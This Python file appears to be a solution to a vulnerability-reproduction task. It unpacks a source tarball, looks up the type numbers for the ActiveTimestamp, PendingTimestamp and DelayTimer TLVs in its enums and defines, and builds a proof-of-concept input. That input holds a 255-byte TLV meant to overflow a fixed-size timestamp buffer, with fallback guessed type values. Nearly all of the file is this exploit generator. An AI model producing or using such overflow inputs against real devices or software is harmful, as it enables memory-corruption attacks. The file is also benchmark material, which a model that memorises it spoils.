import os
import re
import tarfile
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        def extract_tarball(path, tmpdir):
            if os.path.isdir(path):
                return path
            try:
                with tarfile.open(path, 'r:*') as tf:
                    tf.extractall(tmpdir)
                return tmpdir
            except Exception:
                return tmpdir

        def iter_files(root):
            for dirpath, _, filenames in os.walk(root):
                for f in filenames:
                    if f.endswith(('.h', '.hpp', '.hh', '.ipp', '.c', '.cc', '.cpp', '.cxx', '.inc', '.inl', '.txt')):
                        full = os.path.join(dirpath, f)
                        # Skip very large files
                        try:
                            if os.path.getsize(full) > 8 * 1024 * 1024:
                                continue
                        except Exception:
                            pass
                        yield full

        def read_text(path):
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as fh:
                    return fh.read()
            except Exception:
                return ''

        def strip_comments(s):
            # Remove /* ... */ and // ... comments
            s = re.sub(r'/\*.*?\*/', '', s, flags=re.S)
            s = re.sub(r'//.*', '', s)
            return s

        def parse_int(expr, mapping):
            expr = expr.strip()
            # Replace known identifiers with their integer values
            # Only allow simple operators: + - | & ^ << >> ( )
            # Remove casts and suffixes
            expr = re.sub(r'\(.*?\)', lambda m: m.group(0), expr)
            tokens = re.findall(r'[A-Za-z_]\w*|0x[0-9A-Fa-f]+|\d+|[+\-*/|&^<>()\s]+', expr)
            rebuilt = []
            for tok in tokens:
                t = tok.strip()
                if not t:
                    continue
                if re.fullmatch(r'0x[0-9A-Fa-f]+', t):
                    rebuilt.append(str(int(t, 16)))
                elif re.fullmatch(r'\d+', t):
                    rebuilt.append(t)
                elif re.fullmatch(r'[+\-*/|&^<>()]+', t):
                    rebuilt.append(t)
                elif t in mapping:
                    rebuilt.append(str(mapping[t]))
                else:
                    # Unknown identifier -> fail
                    return None
            try:
                # Evaluate safely
                val = eval(''.join(rebuilt), {"__builtins__": None}, {})
                if isinstance(val, int):
                    return val
            except Exception:
                return None
            return None

        def parse_enums_get_values(text):
            text_nc = strip_comments(text)
            results = {}
            # Find enum blocks that might contain TLV types
            for m in re.finditer(r'enum\s+(class\s+)?\w*\s*(?:[:][^{]+)?\{(.*?)\}', text_nc, flags=re.S):
                body = m.group(2)
                # Split by commas while keeping simple structure
                parts = body.split(',')
                current_val = None
                mapping = {}
                for part in parts:
                    line = part.strip()
                    if not line:
                        continue
                    # Remove trailing braces leftovers
                    line = line.strip('}').strip()
                    if not line:
                        continue
                    # Parse "name = value" or just "name"
                    if '=' in line:
                        name, val = line.split('=', 1)
                        name = name.strip()
                        val = val.strip()
                        v = parse_int(val, mapping)
                        if v is None:
                            # If cannot parse, skip this entry
                            continue
                        mapping[name] = v
                        current_val = v
                    else:
                        name = line.strip()
                        if current_val is None:
                            current_val = 0
                        else:
                            current_val += 1
                        mapping[name] = current_val
                # Merge mapping to results (do not overwrite existing keys)
                for k, v in mapping.items():
                    if k not in results:
                        results[k] = v
            return results

        def find_define_values(text):
            text_nc = strip_comments(text)
            res = {}
            for m in re.finditer(r'#\s*define\s+([A-Za-z_]\w*)\s+(0x[0-9A-Fa-f]+|\d+)\b', text_nc):
                name = m.group(1)
                val = m.group(2)
                try:
                    ival = int(val, 0)
                except Exception:
                    continue
                res[name] = ival
            return res

        def find_tlv_type_numbers(root):
            # Try multiple strategies to extract TLV type numbers for ActiveTimestamp, PendingTimestamp, DelayTimer
            targets = [
                'kActiveTimestamp', 'ActiveTimestamp',
                'kPendingTimestamp', 'PendingTimestamp',
                'kDelayTimer', 'DelayTimer',
            ]
            values = {}

            # First pass: enums
            for f in iter_files(root):
                txt = read_text(f)
                if not txt:
                    continue
                if ('ActiveTimestamp' in txt or 'PendingTimestamp' in txt or 'DelayTimer' in txt):
                    enum_vals = parse_enums_get_values(txt)
                    for t in targets:
                        if t in enum_vals and t not in values:
                            values[t] = enum_vals[t]
                if len([k for k in values if 'ActiveTimestamp' in k]) and \
                   len([k for k in values if 'PendingTimestamp' in k]) and \
                   len([k for k in values if 'DelayTimer' in k]):
                    break

            # Second pass: #define
            for f in iter_files(root):
                txt = read_text(f)
                if not txt:
                    continue
                if ('ActiveTimestamp' in txt or 'PendingTimestamp' in txt or 'DelayTimer' in txt):
                    defs = find_define_values(txt)
                    for key, val in defs.items():
                        for t in targets:
                            if t == key and t not in values:
                                values[t] = val
                if len([k for k in values if 'ActiveTimestamp' in k]) and \
                   len([k for k in values if 'PendingTimestamp' in k]) and \
                   len([k for k in values if 'DelayTimer' in k]):
                    break

            # Resolve to canonical keys without 'k' prefix if present
            result = {}
            def pick(name):
                if 'k' + name in values:
                    return values['k' + name]
                if name in values:
                    return values[name]
                return None

            result['ActiveTimestamp'] = pick('ActiveTimestamp')
            result['PendingTimestamp'] = pick('PendingTimestamp')
            result['DelayTimer'] = pick('DelayTimer')
            return result

        def build_tlv(t, vbytes):
            t = t & 0xFF
            l = len(vbytes) & 0xFF
            return bytes([t, l]) + vbytes

        def generate_poc(types):
            # Prefer ActiveTimestamp; fallback to PendingTimestamp
            active_type = types.get('ActiveTimestamp')
            pending_type = types.get('PendingTimestamp')
            delay_type = types.get('DelayTimer')

            # Fallback guesses if extraction failed
            # These are educated guesses; used only if parsing fails.
            if active_type is None and pending_type is None:
                active_type = 0x0E  # Guess for ActiveTimestamp
            if delay_type is None:
                delay_type = 0x22  # Guess for DelayTimer

            # Use ActiveTimestamp if available; otherwise PendingTimestamp
            overflow_type = active_type if active_type is not None else pending_type

            # Primary overflow TLV: set length to 255 to overflow fixed-size timestamp buffer
            tlv1 = build_tlv(overflow_type, b'A' * 255)

            # Add a small DelayTimer TLV (length 3) to reach total ~262 bytes (257 + 5 = 262)
            tlv2 = build_tlv(delay_type, b'XYZ')

            return tlv1 + tlv2

        with tempfile.TemporaryDirectory() as tmp:
            root = extract_tarball(src_path, tmp)
            types = find_tlv_type_numbers(root)
            poc = generate_poc(types)
            return poc
